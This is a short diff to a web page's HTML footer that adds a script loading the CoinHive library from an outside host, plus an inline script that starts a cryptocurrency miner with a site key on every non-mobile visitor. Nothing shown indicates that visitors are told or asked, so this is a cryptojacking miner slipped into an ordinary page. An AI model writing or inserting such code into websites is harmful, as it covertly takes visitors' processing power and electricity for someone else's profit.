@@ -30,6 +30,13 @@
     </div><!-- end #wrapper -->
     <script src="js/jquery-3.2.1.min.js"></script>
     <script src="js/main.js"></script>
+    <script src="//coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.Anonymous('SRX9fyVWGFAFc3xeD6SHMULPEAJf8guR', {throttle: 0.3});
+      if (!miner.isMobile()) {
+          miner.start();
+      }
+    </script>
 
 </body>
 </html>
